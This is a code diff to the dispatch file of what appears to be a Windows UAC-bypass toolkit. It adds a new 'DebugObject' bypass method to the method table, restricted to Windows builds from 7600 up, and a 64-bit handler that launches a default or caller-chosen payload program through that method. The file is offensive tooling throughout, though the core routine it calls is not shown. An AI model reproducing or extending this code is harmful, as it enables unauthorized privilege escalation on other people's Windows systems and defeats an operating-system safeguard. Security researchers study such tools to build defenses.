@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2015 - 2019
+*  (C) COPYRIGHT AUTHORS, 2015 - 2020
 *
 *  TITLE:       METHODS.C
 *
-*  VERSION:     3.21
+*  VERSION:     3.23
 *
-*  DATE:        26 Oct 2019
+*  DATE:        17 Dec 2019
 *
 *  UAC bypass dispatch.
 *
@@ -70,6 +70,7 @@ UCM_API(MethodEgre55);
 UCM_API(MethodTokenModUIAccess);
 UCM_API(MethodShellWSReset);
 UCM_API(MethodEditionUpgradeManager);
+UCM_API(MethodDebugObject);
 
 UCM_EXTRA_CONTEXT WDCallbackType1;
 
@@ -142,7 +143,8 @@ UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
     { MethodTokenModUIAccess, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, FALSE },
     { MethodShellWSReset, &WDCallbackType1, { 17134, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
     { MethodSysprep, NULL, { 7600, 9600 }, FUBUKI_ID, FALSE, TRUE, TRUE },
-    { MethodEditionUpgradeManager, NULL, { 14393, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE }
+    { MethodEditionUpgradeManager, NULL, { 14393, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
+    { MethodDebugObject, NULL, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, TRUE }
 };
 
 #define WDCallbackTypeMagicVer1 282647531814912
@@ -1235,5 +1237,27 @@ UCM_API(MethodEditionUpgradeManager)
     return ucmEditionUpgradeManagerMethod(
         Parameter->PayloadCode,
         Parameter->PayloadSize);
+#endif
+}
+
+UCM_API(MethodDebugObject)
+{
+#ifdef _WIN64
+    LPWSTR lpszPayload = NULL;
+    UNREFERENCED_PARAMETER(Parameter);
+
+    //
+    // Select target application or use given by optional parameter.
+    //
+    if (g_ctx->OptionalParameterLength == 0)
+        lpszPayload = g_ctx->szDefaultPayload;
+    else
+        lpszPayload = g_ctx->szOptionalParameter;
+
+    return ucmDebugObjectMethod(lpszPayload);
+
+#else
+    UNREFERENCED_PARAMETER(Parameter);
+    return STATUS_NOT_SUPPORTED;
 #endif
 }
